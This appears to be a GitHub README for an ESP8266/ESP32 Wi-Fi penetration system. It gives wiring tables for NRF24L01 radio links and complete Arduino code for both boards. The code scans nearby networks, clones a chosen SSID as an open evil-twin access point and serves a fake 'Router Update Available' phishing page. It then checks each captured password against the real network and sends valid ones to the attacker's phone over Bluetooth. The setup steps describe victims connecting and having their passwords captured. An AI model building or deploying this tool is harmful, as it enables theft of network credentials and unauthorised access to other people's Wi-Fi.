# WIFI-project-penetration-system
**highly coordinated, multi-microcontroller Wi-Fi penetration system**

- **ESP8266**: Scanning + Deauth + Control Center  
- **ESP32 WROOM**: Fake Access Point + Phishing Page + Password Verification  
- **NRF24L01**: Wireless data bridge between ESP8266 and ESP32  
- **Bluetooth**: Send password to your mobile  
- **Phone**: Control UI via web interface on ESP8266 AP


---

## **[1] ESP8266 — Command & Scan Hub**

### **Functions**:
- Create an Access Point (e.g., `Controller_AP`)
- Serve a web UI to:
  - View scanned networks
  - Select a target network
- Send selected SSID via NRF24L01 to ESP32
- Start deauth attack on the selected SSID

---

### **[2] ESP32 — Fake Access Point + Phishing**

### **Functions**:
- Receive SSID over NRF24L01
- Clone the fake AP using SoftAP
- Show captive portal (phishing)
- Validate password format (via WiFi.begin)
- If correct, send to phone via Bluetooth
- If wrong, show error and retry

---

### **[3] NRF24L01 Communication**

- ESP8266 = NRF **transmitter**  
- ESP32 = NRF **receiver**

---

## ⚠️⚠️⚠️ **complete wiring connections** for the **ESP8266 and ESP32-WROOM with NRF24L01** modules. Both boards will communicate wirelessly using **SPI** with NRF24L01 modules.

## **1. NRF24L01 with ESP8266 (e.g., NodeMCU)**  
> **Role**: Transmitter (sends SSID to ESP32 when target is selected)

### **Wiring:**

| **NRF24L01 Pin** | **ESP8266 Pin** |
|------------------|-----------------|
| VCC              | **3.3V** (Important: Use capacitor for stability — see note below) |
| GND              | GND             |
| CE               | **D2 (GPIO4)**  |
| CSN (CS)         | **D1 (GPIO5)**  |
| SCK              | **D5 (GPIO14)** |
| MOSI             | **D7 (GPIO13)** |
| MISO             | **D6 (GPIO12)** |

**Note**:  
- Add a **10µF capacitor** between **VCC and GND** of the NRF24L01 to prevent power fluctuation.
- Use **external 3.3V LDO regulator** if NRF behaves erratically (ESP8266 3.3V is weak for NRF).

---

## **2. NRF24L01 with ESP32-WROOM-32**  
> **Role**: Receiver (receives SSID and creates Fake Access Point)

### **Wiring:**

| **NRF24L01 Pin** | **ESP32 Pin**     |
|------------------|------------------|
| VCC              | **3.3V**         |
| GND              | GND              |
| CE               | **GPIO26**       |
| CSN (CS)         | **GPIO27**       |
| SCK              | **GPIO18**       |
| MOSI             | **GPIO23**       |
| MISO             | **GPIO19**       |

**Note**:
- Same as above: Add a 10µF capacitor across VCC and GND.
- Use stable 3.3V from ESP32 LDO or external regulator for NRF.

---

## ⚠️ **Capacitor Wiring**  
Add a **10µF (or 4.7µF–22µF) electrolytic or ceramic capacitor** between **VCC and GND** of the **NRF module** to stabilize power. Connect:
- Capacitor **positive leg** to VCC  
- Capacitor **negative leg** to GND  

---

## **Summary Diagram (for clarity)**

```yaml
ESP8266 (NodeMCU)         NRF24L01
---------------------     ----------
3.3V                --->  VCC
GND                 --->  GND
D2  (GPIO4)         --->  CE
D1  (GPIO5)         --->  CSN (CS)
D5  (GPIO14)        --->  SCK
D7  (GPIO13)        --->  MOSI
D6  (GPIO12)        --->  MISO

ESP32-WROOM-32           NRF24L01
---------------------     ----------
3.3V                --->  VCC
GND                 --->  GND
GPIO26             --->  CE
GPIO27             --->  CSN (CS)
GPIO18             --->  SCK
GPIO23             --->  MOSI
GPIO19             --->  MISO
```

---

### Check the Wireless modules are working properly :: NRF module check --> [code](https://github.com/akashdip2001/Wireless-LED-Control-Code-with-NRF)


<p align="center">
  <img src="https://github.com/akashdip2001/High-end-autonomous-anomaly-detection-robot/raw/main/img/modules%20(4).jpg" alt="Image 1" width="46%" style="margin-right: 10px;"/>
  <img src="https://github.com/akashdip2001/High-end-autonomous-anomaly-detection-robot/raw/main/img/modules%20(5).jpg" alt="Image 2" width="46%" style="margin-right: 10px;"/>
</p>

---

## 👨‍💻 **Code Components**

### ✅ ESP8266 Code (Access Point + WiFi Scanner + Web UI + NRF TX + Deauth trigger)

> You’ll need these libraries:
- `ESP8266WiFi.h`
- `ESPAsyncWebServer.h`
- `nRF24L01.h`, `RF24.h`

#### **ESP8266**
```cpp
#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

const char* ap_ssid = "Controller_AP";
const char* ap_password = "12345678";

AsyncWebServer server(80);

RF24 radio(D2, D1); // CE, CSN
const byte address[6] = "00001";

String networksHTML = "";

void scanNetworks() {
  networksHTML = "";
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) {
    networksHTML += "<p><a href='/select?ssid=" + WiFi.SSID(i) + "'>" + WiFi.SSID(i) + "</a></p>";
  }
}

void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_password);

  radio.begin();
  radio.setPALevel(RF24_PA_LOW);
  radio.openWritingPipe(address);
  radio.setChannel(108);
  radio.stopListening();

  scanNetworks();

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", "<h2>Nearby Wi-Fi Networks</h2>" + networksHTML);
  });

  server.on("/select", HTTP_GET, [](AsyncWebServerRequest *request){
    if (request->hasParam("ssid")) {
      String targetSSID = request->getParam("ssid")->value();
      radio.write(&targetSSID[0], targetSSID.length());
      request->send(200, "text/html", "<p>Target SSID Sent: " + targetSSID + "</p>");
    } else {
      request->send(400, "text/plain", "SSID not provided.");
    }
  });

  server.begin();
}

void loop() {
  // Optional: refresh scan periodically
}
```

---

### ✅ ESP32 Code (NRF24 RX + Fake AP + Captive Portal + Bluetooth)

> Libraries needed:
- `WiFi.h`, `WebServer.h`
- `SPI.h`, `nRF24L01.h`, `RF24.h`
- `BluetoothSerial.h`

#### **ESP32**

```cpp
#include <WiFi.h>
#include <WebServer.h>
#include <BluetoothSerial.h>
#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

BluetoothSerial BT;
RF24 radio(26, 27); // CE, CSN

const byte address[6] = "00001";
char receivedSSID[50];

WebServer server(80);
String inputHTML = "<html><body><h3>Router Update Available</h3><form action='/submit'><input name='pass'><input type='submit'></form><p id='err' style='color:red;'></p></body></html>";

void handleSubmit() {
  String pass = server.arg("pass");

  WiFi.begin(receivedSSID, pass.c_str());
  delay(3000);

  if (WiFi.status() == WL_CONNECTED) {
    BT.println("Correct password for SSID: " + String(receivedSSID) + " → " + pass);
    server.send(200, "text/html", "<h4>Password verified and accepted!</h4>");
  } else {
    server.send(200, "text/html", inputHTML + "<script>document.getElementById('err').innerText='Wrong password. Try again.'</script>");
  }
}

void setup() {
  Serial.begin(115200);
  BT.begin("ESP32_PasswordCatcher");

  radio.begin();
  radio.setPALevel(RF24_PA_LOW);
  radio.openReadingPipe(1, address);
  radio.setChannel(108);
  radio.startListening();

  WiFi.mode(WIFI_AP);

  server.on("/", []() {
    server.send(200, "text/html", inputHTML);
  });
  server.on("/submit", handleSubmit);
  server.begin();
}

void loop() {
  if (radio.available()) {
    radio.read(&receivedSSID, sizeof(receivedSSID));
    Serial.print("Received SSID: ");
    Serial.println(receivedSSID);

    WiFi.softAP(receivedSSID, "");
  }
  server.handleClient();
}
```

---

## ✅ How to Connect Mobile??

- Connect phone to `Controller_AP`
- Web UI appears at `192.168.4.1/` (auto-open if captive portal configured)
- Select SSID → ESP8266 sends it via NRF → ESP32 clones SSID
- Victim connects → Phishing page shows → Captures password
- ESP32 validates, and if correct → sends it to your phone over Bluetooth

---

### ⚠️ **upgade Needed** !!

You can:
- Log attempts with timestamps in EEPROM
- Add OLED or LED status on success
- Add reset logic using a push button (for both modules)

---

### ⚙️ future improvement plan?
- Android app to receive Bluetooth passwords with UI?
- NRF communication debugging tools?
- PCB design or wiring diagram?

